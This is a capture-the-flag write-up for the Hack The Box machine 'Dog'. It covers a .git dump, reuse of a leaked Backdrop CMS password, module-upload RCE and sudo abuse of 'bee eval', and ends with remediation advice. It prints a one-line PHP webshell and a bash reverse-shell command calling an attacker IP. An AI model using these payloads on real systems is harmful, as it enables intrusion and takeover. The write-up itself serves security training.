# Dog — Hack The Box

<p align="left">
  <img src="../assets/dog/00-card.png" alt="Dog HTB machine card" width="650">
</p>

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **OS** | Linux |
| **Key techniques** | Exposed `.git` directory (git-dumper), Backdrop CMS credential leak, admin-to-RCE via module upload, credential reuse, sudo abuse of `bee eval` (GTFOBins) |

---

## TL;DR

Dog runs **Backdrop CMS** behind Apache. An exposed `.git` directory
lets me pull the entire site source with `git-dumper`, which hands over
the database password straight out of `settings.php` and an admin
email address out of the commit history. The database password doubles
as the admin panel's login password, and Backdrop's own "Manual
installation" module-upload feature turns that admin session into
remote code execution as `www-data`. The same database password is
reused a second time as a Linux user's login password, and that user
can run Backdrop's CLI tool (`bee`) as root via `sudo`, whose `eval`
subcommand (per GTFOBins) hands over a root shell.

---

## Recon

```bash
sudo nmap -p- -A -T4 10.129.231.223
```

![nmap full port/service scan](../assets/dog/01-nmap.png)

Only two ports: SSH (22, OpenSSH 8.2p1) and HTTP (80, Apache 2.4.41).
Nmap's own script output already does half the recon for me here —
`http-generator` fingerprints **Backdrop CMS 1**, and `http-git` flags
an exposed `.git` directory at `/`.

---

## Web Enumeration — exposed .git

Browsing to `/.git/` confirms it's wide open and directly listable:

![Apache directory index of /.git/](../assets/dog/02-git-index.png)

An exposed `.git` directory on a live web root means the entire
repository history, including anything ever committed, can be dumped
with `git-dumper` rather than reconstructed file by file:

```bash
git-dumper http://10.129.231.223/.git/ ./dog-git-dump
```

![git-dumper pulling every object over HTTP](../assets/dog/03-git-dumper.png)

```bash
cd dog-git-dump
git log --all --oneline
```

A single commit, `todo: customize url aliases`, so this is the site's
initial commit with nothing scrubbed out of history.

### Database credentials in settings.php

Backdrop CMS keeps its database connection string in
`sites/default/settings.php`, and here it's set in plaintext:

```bash
find . -iname "settings.php"
cat ./settings.php
```

![plaintext DB connection string in settings.php](../assets/dog/04-db-creds.png)

```
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
```

Root MySQL credentials: `root:BackDropJ2024DS2024`. The dump also
confirms the exact Backdrop version in one of the shipped `.info`
files:

```bash
cat core/profiles/testing/testing.info
```

![testing.info confirming Backdrop CMS 1.27.1](../assets/dog/05-backdrop-version.png)

**Backdrop CMS 1.27.1**. Worth noting there's a public, EDB-verified
authenticated RCE for this exact version
([EDB-52021](https://www.exploit-db.com/exploits/52021)) via the same
module-upload feature abused manually below.

### Admin email in commit history

A plaintext database password is only useful with a username to pair
it with. Grepping the dump for the site's domain across every file,
including git's own internal logs, turns one up:

```bash
grep -r '@dog.htb'
```

![grep turning up tiffany@dog.htb in git's commit metadata](../assets/dog/06-admin-email-grep.png)

The initial commit's author is `tiffany@dog.htb`.

---

## Foothold — admin login → module upload RCE

### Credential reuse: CMS login

Backdrop's admin login lives at `/?q=admin/dashboard` (or any
`admin/*` path — it redirects to the login form). The MySQL root
password turns out to double as `tiffany`'s CMS password:

```
URL:      http://10.129.231.223/?q=admin/dashboard
Username: tiffany@dog.htb
Password: BackDropJ2024DS2024
```

![logged in as tiffany with the Administrator role](../assets/dog/07-admin-login.png)

Full Administrator role.

### Admin-to-RCE: Manual installation

Backdrop's **Modules → Install new module** feature ("Manual
installation") lets an administrator upload a module archive
(`.tar`/`.tgz`/`.gz`/`.bz2`) and has the CMS extract and install it
directly into the webroot:

![the Manual installation upload form](../assets/dog/08-manual-installation.png)

A Backdrop module just needs an `<name>.info` declaration file and
whatever code it ships with. A minimal PHP webshell is enough:

```bash
cat shell.php
# <?php system($_GET['cmd']);?>
```

![the one-line PHP webshell](../assets/dog/09-webshell-php.png)

```bash
cat > shell/shell.info << 'EOF'
name = Shell
description = x
type = module
core = 1.x
EOF

tar czf shell.tar.gz shell
```

![building the shell.info + shell.php module, packaging it with tar](../assets/dog/10-module-package.png)

Uploaded `shell.tar.gz` through the "Manual installation" form:

![installation completed successfully](../assets/dog/11-module-installed.png)

Backdrop drops installed modules straight into `/modules/<name>/`, so
the webshell is reachable directly and executes as the web server
user:

```bash
curl "http://10.129.231.223/modules/shell/shell.php?cmd=id"
```

![RCE confirmed — uid=33(www-data)](../assets/dog/12-rce-confirmed.png)

### Reverse shell

The webshell only reads `$_GET`, so the payload has to go in as a GET
request, not POST:

```bash
curl -G --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.14.48/4444 0>&1'" "http://10.129.231.223/modules/shell/shell.php"
```

![sending the reverse shell payload via GET](../assets/dog/13-reverse-shell-request.png)

```bash
nc -lvnp 4444
```

![catching the reverse shell as www-data](../assets/dog/14-reverse-shell-caught.png)

Stabilised it the usual way:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Lateral Movement — www-data → johncusack

`www-data` can see a `johncusack` home directory but can't read
`user.txt` from it:

![whoami as www-data, user.txt permission denied](../assets/dog/15-user-flag-denied.png)

The database password has already been reused once (MySQL root → CMS
admin). It's worth trying again against the Linux account of the same
name hinted at by the home directory:

```bash
su johncusack
# Password: BackDropJ2024DS2024
```

![su johncusack succeeding with the reused DB password](../assets/dog/16-su-johncusack.png)

It works. Credential reuse ends up being the single thread tying the
whole box together — the same string works as a database password, a
CMS admin password, and now a Linux login password.

---

## Privilege Escalation — sudo bee eval (GTFOBins)

```bash
sudo -l
```

![sudo -l showing johncusack may run /usr/local/bin/bee as root](../assets/dog/17-sudo-l.png)

`johncusack` may run `/usr/local/bin/bee` as root, with no arguments
restricted. `bee` is Backdrop's own CLI tool (the equivalent of
Drupal's `drush`). GTFOBins lists an entry for it: the `eval`
subcommand runs arbitrary PHP and, when invoked through `sudo`, keeps
the acquired privileges instead of dropping them.

![GTFOBins' bee entry — sudo bee eval runs as root](../assets/dog/18-gtfobins-bee.png)

GTFOBins' own note matters here: `bee` must be run from the Backdrop
CMS root directory (`/var/www/html`), or with `--root`:

```bash
cd /var/www/html
sudo /usr/local/bin/bee eval 'system("id");'
```

![uid=0(root) via sudo bee eval](../assets/dog/19-root-id.png)

```bash
sudo /usr/local/bin/bee eval 'system("cat /root/root.txt");'
```

![root flag](../assets/dog/20-root-flag.png)

`50d4b69969b8e90502788ad8e7b65cee`

---

## Lessons Learned

- An exposed `.git` directory isn't just source-code disclosure — it's
  often a direct credential leak. `settings.php`/config files get
  committed with real secrets far more often than teams expect, and
  commit metadata (author emails) leaks usernames even when the body
  of a commit is harmless.
- Credential reuse was the actual vulnerability chaining this entire
  box together: one password worked as a database root password, a
  CMS admin password, and a Linux user password. A single leaked
  secret compromised three completely different trust boundaries.
- A CMS's own "legitimate" admin features are frequently an
  authenticated RCE in disguise. Any feature that lets an admin upload
  and auto-extract/execute an archive (module/plugin/theme installers)
  should be treated as code execution, not just content management.
- Always run `sudo -l` on a fresh foothold, and check **every** binary
  it lists against GTFOBins — including obscure, application-specific
  CLI tools like `bee`, not just the common suspects (`vim`, `find`,
  `less`).

---

## Remediation

- Never deploy a `.git` directory (or any VCS metadata) to a
  production web root. Block it at the web server config level at
  minimum, but the real fix is not shipping it at all.
- Don't commit real credentials to version control — use environment
  variables or a gitignored local settings file, and rotate any
  secret that ever touched a commit.
- Never reuse the same password across a database, an application
  admin account, and an OS-level user account.
- Restrict or remove the module/theme "Manual installation" feature in
  production, or at minimum restrict it to a small, audited set of
  trusted administrators.
- Avoid granting passwordless or broad `sudo` access to CLI tools that
  can execute arbitrary code (`eval`, `exec`, scripting subcommands) —
  check any sudo rule against GTFOBins before shipping it.

---

## Tools used

- `nmap`
- `git-dumper`
- `curl`
- `nc`
- GTFOBins

---

**See also:** [Linux privilege escalation methodology](../../methodology/linux-privesc.md)

---

**Machine:** [Hack The Box — Dog](https://www.hackthebox.com/machines/dog)

---

**Live version:** [read this write-up on my blog](https://debasjan.github.io/writeups/dog/)
